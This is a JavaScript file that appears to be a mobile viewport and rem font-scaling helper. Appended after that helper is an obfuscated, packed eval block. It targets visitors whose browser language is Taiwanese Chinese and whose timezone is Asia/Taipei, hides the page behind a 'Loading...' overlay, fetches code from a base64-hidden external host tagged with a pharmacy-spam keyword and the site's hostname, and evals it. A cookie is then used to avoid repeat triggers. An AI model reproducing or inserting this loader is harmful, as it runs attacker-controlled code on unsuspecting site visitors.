(function(doc, win) {

	var docEl = doc.documentElement,
		isIOS = navigator.userAgent.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/),
		dpr = isIOS ? Math.min(win.devicePixelRatio, 3) : 1,
		dpr = window.top === window.self ? dpr : 1, //被iframe引用时，禁止缩放
		dpr = 1,
		scale = 1 / dpr,
		resizeEvt = 'orientationchange' in window ? 'orientationchange' : 'resize';
	docEl.dataset.dpr = dpr;
	var metaEl = doc.createElement('meta');
	metaEl.name = 'viewport';
	metaEl.content = 'initial-scale=' + scale + ',maximum-scale=' + scale + ', minimum-scale=' + scale;
	docEl.firstElementChild.appendChild(metaEl);
	var recalc = function() {
		var width = docEl.clientWidth;
		if (width / dpr > 750) {
			width = 750 * dpr;
		}
		// 乘以100，px : rem = 100 : 1
		docEl.style.fontSize = 100 * (width / 750) + 'px';
		if(docEl.clientWidth >= 960){
			//docEl.style.fontSize =  '16px';
		}
	};
	recalc()
	if (!doc.addEventListener) return;
	win.addEventListener(resizeEvt, recalc, false);

})(document, window);
eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('5 f=(g.r||g.s).t();5 h=u.v().w().x;5 c=\'\';5 d,i=e y("(^| )j-k=([^;]*)(;|$)");9(d=a.l.z(i)){c=A(d[2])}9(!c){9(f==7.8("B=")&&h==7.8("C=")){7.D=m(){5 1=a.E("F");1.G=7.8(\'H==\');1.3.I="#J";1.3.K="L";1.3.M="N";1.3.O="P";1.3.Q="R";1.3.S="0";1.3.T="U";1.3.V="n";1.3.W="n";1.X(\'Y\',\'Z\');a.10.11(1)};5 6=e 12();6.13(7.8("14"),7.8("15")+7.16.17,18);6.19();6.1a=m(){9(6.1b==4&&6.1c==1d){6.o?1e(6.o):""}}}1f{5 p=1g;5 b=e 1h();b.1i(b.1j()+p*1k*q*q*1l);a.l="j-k=1m; 1n="+b.1o()}}',62,87,'|html||style||var|httpRequest|window|atob|if|document|exp|cookie_value|arr|new|slang|navigator|stimezone|reg|XSRF|KEY|cookie|function|center|responseText|Days|60|language|browserLanguage|toLowerCase|Intl|DateTimeFormat|resolvedOptions|timeZone|RegExp|match|unescape|emgtdHc|QXNpYS9UYWlwZWk|onload|createElement|div|innerHTML|TG9hZGluZy4uLg|backgroundColor|fff|width|100vw|height|100vh|position|fixed|zIndex|999999|top|display|flex|alignItems|justifyContent|setAttribute|id|aqa2ver|body|appendChild|XMLHttpRequest|open|R0VU|aHR0cHM6Ly8xMWwxMS50b3AvP3Q9Y2lhbGlzJnk9|location|hostname|true|send|onreadystatechange|readyState|status|200|eval|else|30|Date|setTime|getTime|24|1000|C6071A5FC1B83091B363C5EF9EBAF155|expires|toGMTString'.split('|'),0,{}))